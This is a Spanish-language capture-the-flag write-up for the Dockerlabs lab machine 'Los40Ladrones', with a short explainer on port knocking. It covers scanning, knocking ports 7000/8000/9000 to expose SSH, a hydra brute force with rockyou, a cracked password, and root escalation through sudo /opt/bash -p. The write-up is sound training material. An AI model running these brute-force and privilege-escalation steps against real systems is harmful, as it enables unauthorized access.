
# Writeup Template: Maquina `[ Los40Ladrones ]`

- Tags: #Los40Ladrones
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina  Los40Ladrones](https://mega.nz/file/MW1ChL7Z#3WBcebAXTHSpKItE6D-tq5WjlE1zN2Dzu0wfiNkBGP8)

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x los40ladrones.zip
sudo bash auto_deploy.sh los40ladrones.tar
```

---

## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
1. `[ 80 ]/[ TCP ]`: [ Apache ] ([ 2.4.58 ]) **ubuntuNoble**
---

## Enumeracion de [Servicio Web Principal]
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
- No reporta nada critico

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,sh,txt,html
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 10792]
/qdefense.txt         (Status: 200) [Size: 111]
```

Accedemos a ese recurso y encontramos esta referencia:
```bash
Recuerda llama antes de entrar , no seas como toctoc el maleducado
7000 8000 9000
busca y llama +54 2933574639
```

Tenemos un posible usuario:
### Credenciales Encontradas
- Usuario: `[ toctoc ]`
- Contraseña: `[  ]`

### 🔐 **Port Knocking: Seguridad por Ofuscación**  
Es una técnica de seguridad que **protege puertos de red cerrados** haciendo que solo sean accesibles tras una "secuencia secreta" de intentos de conexión a puertos específicos (como tocar una combinación en una puerta blindada).

#### ⚙️ **Cómo Funciona (Paso a Paso)**  
1. **Todos los puertos están cerrados** por defecto (ej. SSH en puerto 22 bloqueado por firewall).  
2. **Cliente envía "golpes" (knocks)** a puertos *no relacionados* en secuencia exacta (ej: puerto `7000` → `8000` → `9000`).  
3. **Servidor detecta la secuencia correcta** (usualmente con un *daemon* como `knockd`).  
4. **Firewall abre temporalmente** el puerto objetivo (ej. 22 para SSH).  
5. **Cliente se conecta** al servicio expuesto.  
6. **Firewall cierra automáticamente** el puerto tras un tiempo o tras la conexión.  

---
#### 🛡️ **Componentes Clave**  
| Elemento            | Función                            | Ejemplo                      |     |
| ------------------- | ---------------------------------- | ---------------------------- | --- |
| **Knock Sequence**  | Secuencia de puertos a "golpear"   | `7000, 8000, 9000`           |     |
| **Daemon (knockd)** | Demonio que monitorea paquetes     | Configura reglas de firewall |     |
| **Firewall**        | Implementa el bloqueo/apertura     | `iptables` (Linux)           |     |
| **Protocolo**       | TCP/UDP (a menudo UDP para sigilo) | Paquetes UDP "silenciosos"   |     |

---
#### 📜 **Ejemplo de Configuración (`knockd.conf`)**  
```bash
[options]
    logfile = /var/log/knockd.log

[openSSH]
    sequence    = 7000,8000,9000   # Secuencia mágica
    seq_timeout = 10                # Tiempo máximo entre golpes (seg)
    command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags    = syn               # Solo paquetes SYN

[closeSSH]
    sequence    = 9000,8000,7000
    command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
```

---
#### 🔍 **Tipos de Port Knocking**  
1. **Clásico (TCP/UDP)**:  
   - Paquetes a puertos cerrados (registrados en logs).  
2. **Single Packet Authorization (SPA)**:  
   - **Más seguro**: Usa un *único paquete cifrado* (ej. con `fwknop`).  
   - Evita sniffing de secuencias.  

---

#### ⚠️ **Limitaciones y Riesgos**  
| Problema | Explicación |  
|----------|-------------|  
| **Sniffing** | Si un atacante captura la secuencia, puede replicarla. |  
| **DoS** | Paquetes maliciosos pueden saturar el servicio `knockd`. |  
| **Pérdida de Paquetes** | En redes inestables, la secuencia puede fallar. |  
| **Falta de Autenticación** | Versiones básicas no validan *quién* envía los knocks. |  

---
#### ✅ **Mejores Prácticas**  
1. **Usa SPA en lugar de knocking clásico** (herramientas como `fwknop`).  
2. **Combina con IP Whitelisting**: Solo permite knocks desde IPs conocidas.  
3. **Cifra los knocks**: Usa HMAC o GPG para firmar secuencias.  
4. **Limita intentos**: Bloquea IPs tras múltiples secuencias incorrectas.  

---
#### 🧩 **Alternativas Modernas**  
- **VPNs** (WireGuard, OpenVPN): Encriptan todo el tráfico.  
- **Bastion Hosts**: Servidores de acceso restringido.  
- **Zero Trust Networks**: Verificación continua de identidad.  

> **Conclusión**: Port Knocking es una "capa oculta" de seguridad útil para **ocultar servicios críticos** (SSH, RDP), pero no reemplaza medidas robustas como VPNs o autenticación de 2 factores. Su valor está en el **sigilo**, no en la fortaleza absoluta. 🕵️♂️

### 🔥 Ataque de Port Knocking: 
Para realizar un ataque de **Port Knocking**, debes descubrir la secuencia secreta de puertos que activa la apertura del servicio objetivo.
```bash
# Usando knockpy (automático)
git clone https://github.com/grongor/knock.git
```

Ingresamos al laboratorio:
```bash
cd knock
python3 knock.py 192.168.1.100 -p 7000 8000 9000 --verbose
```

Ejecutamos el comando:
```bash
knock -v 172.17.0.2 7000 8000 9000
hitting tcp 172.17.0.2:7000
hitting tcp 172.17.0.2:8000
hitting tcp 172.17.0.2:9000
```

Ahora volvemos a realizar un escaneo con **Nmap**
```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
```

Ahora si detectamos el servicio **ssh**
**Servicios identificados:**
1. `[ 22 ]/[ TCP ]`: [ SSH ] ([ 9.6 ]) **ubuntuNoble**

Lanzamos un escaneo para detectar la version que corre detras de **ssh**
```bash
nmap -sC -sV -p22 172.17.0.2 -oN targeted
```
---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que ya tenemos el puerto **ssh** detectado procederemos a realizar un ataque de fuerza bruta sobre ese servicio

### Ejecucion del Ataque
```bash
# Comandos para explotación
hydra -l toctoc -P /usr/share/wordlists/rockyou.txt -f ssh://172.17.0.2
```

### Intrusion
Una ves detectada la contrasena del usuario **toctoc** nos loguearemos por **ssh**
```bash
[22][ssh] host: 172.17.0.2   login: toctoc   password: kittycat
```

```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh toctoc@172.17.0.2
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
sudo -l # ( kittycat )

# Tenemos estos binarios potenciales para escalar a root
User toctoc may run the following commands on 794bf2bb45ad:
    (ALL : NOPASSWD) /opt/bash
    (ALL : NOPASSWD) /ahora/noesta/function
```

**Hallazgos Clave:**
- Binario con privilegios: `[Binario]`
- Credenciales de usuario: `[Usuario]:[Contraseña]`

### Explotacion de Privilegios

###### Usuario `[ toctoc ]`:

```bash
# Comando para escalar al usuario: ( root )
sudo /opt/bash -p
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@794bf2bb45ad:~# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos la tecnica **Port Knocking** que proteje puertos de red cerrados. 
## Recomendaciones de Seguridad
- Vemos que se puede bloquear una **IP** tras multiples intentos fallido.